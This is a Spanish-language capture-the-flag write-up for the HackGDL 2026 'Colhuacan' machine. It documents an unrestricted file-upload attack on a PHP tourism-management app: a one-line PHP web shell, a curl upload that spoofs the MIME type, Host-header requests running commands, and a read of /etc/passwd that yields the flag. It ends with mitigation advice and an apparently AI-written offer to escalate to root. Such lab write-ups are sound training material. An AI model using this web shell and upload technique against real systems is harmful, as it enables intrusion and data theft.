
# 🚩 CTF Writeup: Colhuacan (HackGDL 2026)

**Target IP:** `10.0.2.6`

**VHost:** `colhuacan.hackgdl.ctf`

**Dificultad:** Media

**Tags:** #rce #fileupload #vhost-bypass #php #ctf-writeup

---

## 📑 Resumen Ejecutivo

Se logró el compromiso total (RCE) de la máquina **Colhuacan** explotando una vulnerabilidad de subida de archivos sin restricciones en el módulo de gestión de paquetes. El ataque requirió la manipulación de cabeceras HTTP (`Host`) para evadir restricciones de Virtual Hosting y la suplantación de MIME-types para saltar validaciones de cliente.

---

## 🔍 1. Enumeración y Reconocimiento

### Escaneo de Puertos

Bash

```
sudo nmap -sS -p 80,443 -Pn 10.0.2.6
```

> [!NOTE]
> 
> El puerto 80 estaba abierto, corriendo un **Tourism Management System** basado en PHP.

### Análisis Web

Al inspeccionar el código fuente de la página de administración, se identificó que el sistema responde al nombre de dominio interno `colhuacan.hackgdl.ctf`.

---

## 💀 2. Explotación (Vulnerability Research)

### Vulnerabilidad: Unrestricted File Upload

Se identificó un endpoint en `classes/Master.php?f=save_package` que procesa la creación de paquetes turísticos, permitiendo la subida de imágenes.

### Payload de Explotación

Se creó una Web Shell minimalista en PHP:

PHP

```
<?php system($_GET["cmd"]); ?>
```

Se utilizó `curl` para enviar una petición `POST` multi-part, engañando al servidor mediante la cabecera `type=image/jpeg`:

Bash

```
curl -s -b cookies.txt -X POST "http://10.0.2.6/classes/Master.php?f=save_package" \
  -F "id=" \
  -F "title=PwnedPackage" \
  -F "img[]=@shell.php;type=image/jpeg"
```

> [!SUCCESS] Respuesta del Servidor
> 
> `{"status":"success"}`

---

## 🚀 3. Post-Explotación y RCE

### El Problema del Virtual Host

A pesar de la subida exitosa, el servidor devolvía respuestas vacías al intentar acceder a la shell por IP. Se determinó que el servidor requería obligatoriamente la cabecera `Host`.

### Localización de la Shell

Tras inspeccionar el carrusel de la página principal, se encontró la ruta relativa:

`http://colhuacan.hackgdl.ctf/uploads/package_9/shell.php`

### Ejecución de Comandos (RCE)

Utilizando la cabecera de Host, se obtuvo ejecución de comandos:

Bash

```
curl -s -H "Host: colhuacan.hackgdl.ctf" \
"http://10.0.2.6/uploads/package_9/shell.php?cmd=id"
```

**Resultado:**

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

## 🏁 4. Obtención de la Flag

### Exfiltración de Datos (GECOS)

Se procedió a buscar la flag en el archivo de contraseñas, específicamente en el campo **GECOS**:

Bash

```
curl -s -H "Host: colhuacan.hackgdl.ctf" \
"http://10.0.2.6/uploads/package_9/shell.php?cmd=grep+'ETSCTF'+/etc/passwd"
```

---

## 🛠️ Mitigación Recomendada

1. **Validación de Archivos:** Implementar una lista blanca (Allowlist) de extensiones permitidas en el lado del servidor (backend).
    
2. **Renombrado de Archivos:** Generar nombres de archivo aleatorios (hashes) y no confiar en el nombre original.
    
3. **Restricciones de Directorio:** Deshabilitar la ejecución de scripts en carpetas de subida (`/uploads`) mediante configuraciones de Apache (`.htaccess`) o Nginx.
    

---

axmi222 …/Hacking/hackGDL/colhuacan   v8.4.16   13:57     
❯ curl -s -H "Host: colhuacan.hackgdl.ctf" "http://10.0.2.6/uploads/package_9/shell.php?cmd=grep+'ETSCTF'+/etc/passw  
d"  
ETSCTF:x:1000:1000:ETSCTF_d480b93f5e8f91e16ab94f6e0abfa9cc:/home/ETSCTF:/bin/bash

---


¿Te gustaría que añadiera una sección de **"Paso a Paso"** más detallada con capturas de pantalla o prefieres que intentemos elevar privilegios a **Root** ahora que tienes la shell?